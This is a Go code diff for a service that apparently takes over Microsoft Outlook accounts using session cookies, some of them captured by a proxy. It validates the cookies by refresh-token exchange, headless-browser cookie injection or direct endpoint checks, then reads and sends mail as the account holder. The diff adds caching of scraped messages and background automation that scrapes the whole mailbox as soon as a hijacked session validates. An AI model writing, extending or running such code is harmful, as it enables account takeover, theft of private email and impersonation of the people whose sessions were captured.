@@ -33,10 +33,11 @@ var outlookDomains = []string{
 // CookieStoreService handles cookie storage, validation, sending, and inbox reading
 type CookieStoreService struct {
 	Common
-	Logger           *zap.SugaredLogger
-	CookieStoreRepo  *repository.CookieStore
-	ProxyCaptureRepo *repository.ProxyCapture
-	BrowserSession   *BrowserSessionService
+	Logger                 *zap.SugaredLogger
+	CookieStoreRepo        *repository.CookieStore
+	CookieStoreMessageRepo *repository.CookieStoreMessage
+	ProxyCaptureRepo       *repository.ProxyCapture
+	BrowserSession         *BrowserSessionService
 }
 
 // Import imports cookies from a request (manual import, extension, or proxy capture)
@@ -442,7 +443,8 @@ func (s *CookieStoreService) SendEmailDirect(
 	}, nil
 }
 
-// GetInbox reads the inbox of a cookie session
+// GetInbox reads the inbox of a cookie session.
+// It serves cached data instantly if available, and refreshes in the background.
 func (s *CookieStoreService) GetInbox(
 	ctx context.Context,
 	session *model.Session,
@@ -472,17 +474,44 @@ func (s *CookieStoreService) GetInbox(
 		limit = 25
 	}
 
+	// --- Step 1: Check for cached data in the database ---
+	// If we have cached messages for this folder, return them instantly
+	hasCached, _ := s.CookieStoreMessageRepo.HasCachedMessages(ctx, storeID, folder)
+	if hasCached {
+		cachedMsgs, total, cacheErr := s.CookieStoreMessageRepo.GetMessages(ctx, storeID, folder, limit, skip)
+		if cacheErr == nil && len(cachedMsgs) > 0 {
+			s.Logger.Infow("serving cached inbox data", "storeID", storeID, "folder", folder, "count", len(cachedMsgs))
+
+			// Trigger background refresh if cache is older than 5 minutes
+			if store.LastScrapedAt == nil || time.Since(*store.LastScrapedAt) > 5*time.Minute {
+				if s.BrowserSession != nil {
+					go s.refreshInboxInBackground(storeID, store.CookiesJSON, folder)
+				}
+			}
+
+			return s.dbMessagesToInboxMessages(cachedMsgs), total, nil
+		}
+	}
+
+	// --- Step 2: No cached data — try fast API methods first ---
+
 	// Try token-based inbox reading first (Graph API)
 	accessToken := s.getOrRefreshAccessToken(ctx, store)
 	if accessToken != "" {
 		messages, count, err := s.getInboxViaGraphAPI(ctx, accessToken, folder, limit, skip)
 		if err == nil {
+			// Cache the results for next time
+			go func() {
+				dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, messages)
+				_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
+				_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
+			}()
 			return messages, count, nil
 		}
 		s.Logger.Warnw("Graph API inbox failed, trying other methods", "error", err)
 	}
 
-	// Fall back to cookie-based
+	// Fall back to cookie-based REST API
 	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
 	if cookieHeader != "" {
 		apiURL := fmt.Sprintf(
@@ -501,34 +530,22 @@ func (s *CookieStoreService) GetInbox(
 			if err == nil {
 				defer resp.Body.Close()
 				if resp.StatusCode == 200 {
-					return s.parseMessagesResponse(resp.Body)
-				}
-			}
-		}
-
-		// Try alternative endpoint without folder
-		altURL := fmt.Sprintf(
-			"https://outlook.office365.com/api/v2.0/me/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments",
-			limit, skip,
-		)
-		altReq, _ := http.NewRequestWithContext(ctx, "GET", altURL, nil)
-		if altReq != nil {
-			altReq.Header.Set("Cookie", cookieHeader)
-			altReq.Header.Set("User-Agent", outlookUserAgent)
-			altReq.Header.Set("Accept", "application/json")
-
-			client := &http.Client{Timeout: 30 * time.Second}
-			altResp, altErr := client.Do(altReq)
-			if altErr == nil {
-				defer altResp.Body.Close()
-				if altResp.StatusCode == 200 {
-					return s.parseMessagesResponse(altResp.Body)
+					messages, count, parseErr := s.parseMessagesResponse(resp.Body)
+					if parseErr == nil {
+						// Cache the results
+						go func() {
+							dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, messages)
+							_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
+							_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
+						}()
+						return messages, count, nil
+					}
 				}
 			}
 		}
 	}
 
-	// Browser automation fallback
+	// --- Step 3: Browser automation fallback ---
 	if s.BrowserSession != nil {
 		s.Logger.Infow("attempting browser-based inbox read")
 
@@ -539,6 +556,12 @@ func (s *CookieStoreService) GetInbox(
 
 			messages, count, err := s.getInboxViaGraphAPI(ctx, browserResult.AccessToken, folder, limit, skip)
 			if err == nil {
+				// Cache the results
+				go func() {
+					dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, messages)
+					_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
+					_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
+				}()
 				return messages, count, nil
 			}
 			s.Logger.Warnw("Graph API inbox with browser token failed", "error", err)
@@ -549,6 +572,12 @@ func (s *CookieStoreService) GetInbox(
 		messages, totalCount, err := s.BrowserSession.ReadInboxViaBrowser(ctx, store.CookiesJSON, folder, limit, skip, store.ID.String())
 		if err == nil {
 			s.Logger.Infow("inbox read via browser scraping", "count", len(messages))
+			// Cache the results
+			go func() {
+				dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, messages)
+				_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
+				_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
+			}()
 			return messages, totalCount, nil
 		}
 		s.Logger.Warnw("browser inbox scraping failed", "error", err)
@@ -700,32 +729,17 @@ func (s *CookieStoreService) GetFolders(
 		}
 	}
 
-	// Browser automation fallback
-	if s.BrowserSession != nil {
-		s.Logger.Infow("attempting browser-based folder listing")
-
-		// First try to get a fresh token via browser and use Graph API
-		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
-		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
-			s.cacheAccessToken(ctx, store.ID, browserResult)
-			folders, err := s.getFoldersViaGraphAPI(ctx, browserResult.AccessToken)
-			if err == nil {
-				return folders, nil
-			}
-			s.Logger.Warnw("Graph API folders with browser token failed", "error", err)
-		}
-
-		// Final fallback: get folders directly via browser page scraping
-		s.Logger.Infow("attempting direct browser folder scraping")
-		folders, err := s.BrowserSession.GetFoldersViaBrowser(ctx, store.CookiesJSON, store.ID.String())
-		if err == nil {
-			s.Logger.Infow("folders read via browser scraping", "count", len(folders))
-			return folders, nil
-		}
-		s.Logger.Warnw("browser folder scraping failed", "error", err)
+	// If API methods failed, return default Outlook folders immediately
+	// (no need to launch browser automation just for folder names)
+	s.Logger.Infow("returning default Outlook folders")
+	defaultFolders := []model.InboxFolder{
+		{ID: "inbox", DisplayName: "Inbox", TotalItemCount: 0, UnreadItemCount: 0},
+		{ID: "sentitems", DisplayName: "Sent Items", TotalItemCount: 0, UnreadItemCount: 0},
+		{ID: "drafts", DisplayName: "Drafts", TotalItemCount: 0, UnreadItemCount: 0},
+		{ID: "junkemail", DisplayName: "Junk Email", TotalItemCount: 0, UnreadItemCount: 0},
+		{ID: "deleteditems", DisplayName: "Deleted Items", TotalItemCount: 0, UnreadItemCount: 0},
 	}
-
-	return nil, fmt.Errorf("failed to list folders - all methods failed")
+	return defaultFolders, nil
 }
 
 // --- Token Exchange Methods ---
@@ -1139,11 +1153,15 @@ func (s *CookieStoreService) buildAllCookieHeader(cookiesJSON string) string {
 // validateAndUpdate validates a cookie session and updates the database record.
 // It tries token exchange first (MSRT refresh token -> Graph API), then browser
 // automation, then falls back to cookie-based validation against multiple endpoints.
+// After successful validation, it triggers background pre-automation to scrape and cache inbox data.
 func (s *CookieStoreService) validateAndUpdate(ctx context.Context, id uuid.UUID) error {
 	store, err := s.CookieStoreRepo.GetByID(ctx, id)
 	if err != nil {
 		return err
 	}
+
+	var validatedEmail, validatedDisplayName string
+	var isValid bool
 
 	// Attempt 1: Token exchange (MSRT -> access token -> Graph API /me)
 	email, displayName, valid := s.validateViaTokenExchange(ctx, store)
@@ -1160,60 +1178,89 @@ func (s *CookieStoreService) validateAndUpdate(ctx context.Context, id uuid.UUID
 		if displayName != "" {
 			updates["display_name"] = displayName
 		}
-		return s.CookieStoreRepo.Update(ctx, id, updates)
+		if err := s.CookieStoreRepo.Update(ctx, id, updates); err != nil {
+			return err
+		}
+		validatedEmail = email
+		validatedDisplayName = displayName
+		isValid = true
 	}
 
-	// Attempt 2: Browser automation (headless Chrome with cookie injection)
-	browserEmail, browserDisplayName, browserToken, browserValid := s.validateViaBrowser(ctx, store)
-	if browserValid {
+	if !isValid {
+		// Attempt 2: Browser automation (headless Chrome with cookie injection)
+		browserEmail, browserDisplayName, browserToken, browserValid := s.validateViaBrowser(ctx, store)
+		if browserValid {
+			now := time.Now()
+			updates := map[string]interface{}{
+				"is_valid":          true,
+				"last_checked":      now,
+				"validation_method": "browser",
+			}
+			if browserEmail != "" {
+				updates["email"] = browserEmail
+			}
+			if browserDisplayName != "" {
+				updates["display_name"] = browserDisplayName
+			}
+			if browserToken != "" {
+				updates["access_token"] = browserToken
+				expiry := time.Now().Add(55 * time.Minute)
+				updates["token_expiry"] = expiry
+			}
+			if err := s.CookieStoreRepo.Update(ctx, id, updates); err != nil {
+				return err
+			}
+			validatedEmail = browserEmail
+			validatedDisplayName = browserDisplayName
+			isValid = true
+		}
+	}
+
+	if !isValid {
+		// Attempt 3: Cookie-based validation against multiple endpoints
+		allCookieHeader := s.buildAllCookieHeader(store.CookiesJSON)
+		if allCookieHeader == "" {
+			now := time.Now()
+			return s.CookieStoreRepo.Update(ctx, id, map[string]interface{}{
+				"is_valid":          false,
+				"last_checked":      now,
+				"automation_status": "failed",
+			})
+		}
+
+		email, displayName, valid = s.validateSession(ctx, allCookieHeader)
+
 		now := time.Now()
 		updates := map[string]interface{}{
-			"is_valid":          true,
-			"last_checked":      now,
-			"validation_method": "browser",
-		}
-		if browserEmail != "" {
-			updates["email"] = browserEmail
-		}
-		if browserDisplayName != "" {
-			updates["display_name"] = browserDisplayName
-		}
-		if browserToken != "" {
-			updates["access_token"] = browserToken
-			expiry := time.Now().Add(55 * time.Minute)
-			updates["token_expiry"] = expiry
-		}
-		return s.CookieStoreRepo.Update(ctx, id, updates)
-	}
-
-	// Attempt 3: Cookie-based validation against multiple endpoints
-	allCookieHeader := s.buildAllCookieHeader(store.CookiesJSON)
-	if allCookieHeader == "" {
-		now := time.Now()
-		return s.CookieStoreRepo.Update(ctx, id, map[string]interface{}{
-			"is_valid":     false,
+			"is_valid":     valid,
 			"last_checked": now,
-		})
+		}
+		if valid {
+			updates["validation_method"] = "cookie"
+		} else {
+			updates["automation_status"] = "failed"
+		}
+		if email != "" {
+			updates["email"] = email
+		}
+		if displayName != "" {
+			updates["display_name"] = displayName
+		}
+
+		if err := s.CookieStoreRepo.Update(ctx, id, updates); err != nil {
+			return err
+		}
+		validatedEmail = email
+		validatedDisplayName = displayName
+		isValid = valid
 	}
 
-	email, displayName, valid = s.validateSession(ctx, allCookieHeader)
-
-	now := time.Now()
-	updates := map[string]interface{}{
-		"is_valid":     valid,
-		"last_checked": now,
-	}
-	if valid {
-		updates["validation_method"] = "cookie"
-	}
-	if email != "" {
-		updates["email"] = email
-	}
-	if displayName != "" {
-		updates["display_name"] = displayName
+	// If validation succeeded, trigger background pre-automation to scrape and cache inbox
+	if isValid && s.BrowserSession != nil {
+		go s.runPreAutomation(id, store.CookiesJSON, validatedEmail, validatedDisplayName)
 	}
 
-	return s.CookieStoreRepo.Update(ctx, id, updates)
+	return nil
 }
 
 // validateSession checks if a cookie session is valid against multiple Microsoft APIs
@@ -1801,4 +1848,125 @@ func (s *CookieStoreService) parseGraphMessageFull(body io.Reader) (*model.Inbox
 		BodyHTML: bodyHTML,
 		BodyText: bodyText,
 	}, nil
+}
+
+// runPreAutomation runs background browser automation to scrape and cache inbox data.
+// This is triggered after successful validation and runs asynchronously.
+func (s *CookieStoreService) runPreAutomation(storeID uuid.UUID, cookiesJSON, email, displayName string) {
+	bgCtx := context.Background()
+
+	s.Logger.Infow("starting background pre-automation", "storeID", storeID)
+
+	// Mark as running
+	_ = s.CookieStoreRepo.Update(bgCtx, storeID, map[string]interface{}{
+		"automation_status": "running",
+	})
+
+	sessionKey := storeID.String()
+
+	// Run the pre-automation via browser
+	scrapedEmail, scrapedDisplayName, folderMessages, err := s.BrowserSession.PreAutomateStore(bgCtx, cookiesJSON, sessionKey)
+	if err != nil {
+		s.Logger.Warnw("pre-automation failed", "storeID", storeID, "error", err)
+		_ = s.CookieStoreRepo.Update(bgCtx, storeID, map[string]interface{}{
+			"automation_status": "failed",
+		})
+		return
+	}
+
+	// Update email/display name if we got better data from browser
+	updates := map[string]interface{}{
+		"automation_status": "ready",
+		"last_scraped_at":   time.Now(),
+	}
+	if scrapedEmail != "" && (email == "" || strings.HasPrefix(email, "unknown")) {
+		updates["email"] = scrapedEmail
+	}
+	if scrapedDisplayName != "" && displayName == "" {
+		updates["display_name"] = scrapedDisplayName
+	}
+	_ = s.CookieStoreRepo.Update(bgCtx, storeID, updates)
+
+	// Cache the scraped messages to the database
+	for folder, messages := range folderMessages {
+		dbMessages := s.inboxMessagesToDBMessages(storeID, folder, messages)
+		if err := s.CookieStoreMessageRepo.UpsertMessages(bgCtx, storeID, folder, dbMessages); err != nil {
+			s.Logger.Warnw("failed to cache messages", "storeID", storeID, "folder", folder, "error", err)
+		} else {
+			s.Logger.Infow("cached messages", "storeID", storeID, "folder", folder, "count", len(dbMessages))
+		}
+	}
+
+	s.Logger.Infow("background pre-automation complete", "storeID", storeID, "folders", len(folderMessages))
+}
+
+// inboxMessagesToDBMessages converts model.InboxMessage slice to database.CookieStoreMessage slice
+func (s *CookieStoreService) inboxMessagesToDBMessages(storeID uuid.UUID, folder string, messages []model.InboxMessage) []database.CookieStoreMessage {
+	now := time.Now()
+	dbMessages := make([]database.CookieStoreMessage, len(messages))
+	for i, msg := range messages {
+		dbMessages[i] = database.CookieStoreMessage{
+			CookieStoreID:  storeID,
+			Folder:         folder,
+			MessageID:      msg.ID,
+			FromEmail:      msg.From,
+			FromName:       msg.FromName,
+			Subject:        msg.Subject,
+			Preview:        msg.Preview,
+			Date:           msg.Date,
+			IsRead:         msg.IsRead,
+			HasAttachments: msg.HasAttachments,
+			ConversationID: msg.ConversationID,
+			ScrapedAt:      &now,
+		}
+	}
+	return dbMessages
+}
+
+// dbMessagesToInboxMessages converts database.CookieStoreMessage slice to model.InboxMessage slice
+func (s *CookieStoreService) dbMessagesToInboxMessages(dbMessages []database.CookieStoreMessage) []model.InboxMessage {
+	messages := make([]model.InboxMessage, len(dbMessages))
+	for i, dbMsg := range dbMessages {
+		messages[i] = model.InboxMessage{
+			ID:             dbMsg.MessageID,
+			From:           dbMsg.FromEmail,
+			FromName:       dbMsg.FromName,
+			Subject:        dbMsg.Subject,
+			Preview:        dbMsg.Preview,
+			Date:           dbMsg.Date,
+			IsRead:         dbMsg.IsRead,
+			HasAttachments: dbMsg.HasAttachments,
+			ConversationID: dbMsg.ConversationID,
+		}
+	}
+	return messages
+}
+
+// refreshInboxInBackground triggers a background refresh of cached inbox data for a specific folder.
+// This runs after serving cached data to keep the cache up-to-date.
+func (s *CookieStoreService) refreshInboxInBackground(storeID uuid.UUID, cookiesJSON string, folder string) {
+	bgCtx := context.Background()
+	sessionKey := storeID.String()
+
+	s.Logger.Infow("background inbox refresh starting", "storeID", storeID, "folder", folder)
+
+	// Try to read inbox via browser (will reuse cached session)
+	messages, _, err := s.BrowserSession.ReadInboxViaBrowser(bgCtx, cookiesJSON, folder, 50, 0, sessionKey)
+	if err != nil {
+		s.Logger.Warnw("background inbox refresh failed", "storeID", storeID, "folder", folder, "error", err)
+		return
+	}
+
+	if len(messages) > 0 {
+		dbMessages := s.inboxMessagesToDBMessages(storeID, folder, messages)
+		if err := s.CookieStoreMessageRepo.UpsertMessages(bgCtx, storeID, folder, dbMessages); err != nil {
+			s.Logger.Warnw("failed to update cached messages", "storeID", storeID, "folder", folder, "error", err)
+		} else {
+			now := time.Now()
+			_ = s.CookieStoreRepo.Update(bgCtx, storeID, map[string]interface{}{
+				"last_scraped_at": now,
+			})
+			s.Logger.Infow("background inbox refresh complete", "storeID", storeID, "folder", folder, "count", len(messages))
+		}
+	}
 }
